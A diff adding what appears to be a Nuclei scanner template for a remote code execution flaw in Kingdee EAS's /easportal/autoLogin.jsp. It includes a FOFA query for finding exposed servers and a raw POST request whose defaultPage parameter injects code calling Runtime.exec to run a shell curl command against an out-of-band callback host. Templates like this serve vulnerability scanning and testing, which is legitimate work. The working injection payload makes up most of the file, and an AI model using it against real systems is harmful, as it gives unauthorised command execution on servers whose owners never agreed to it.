@@ -1,0 +1,27 @@
+id: kingdee_eas_autologin_rce
+
+info:
+  name: kingdee_eas_autologin_rce
+  author: PokerSec
+  severity: high
+  metadata:
+    fofasearch: body="/eassso/common/js"
+  tags: kingdee,rce,kingdee-eas
+
+http:
+  - raw:
+      - |
+        POST /easportal/autoLogin.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 312
+        Connection: keep-alive
+
+        defaultPage=/autoLogin.jsp?defaultPage=/BIReport&json=1);var cc=new Array('/bin/sh', '-c', 'curl http://{{interactsh-url}}/Q12345');java.lang.Runtime.getRuntime().exec(cc);//
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
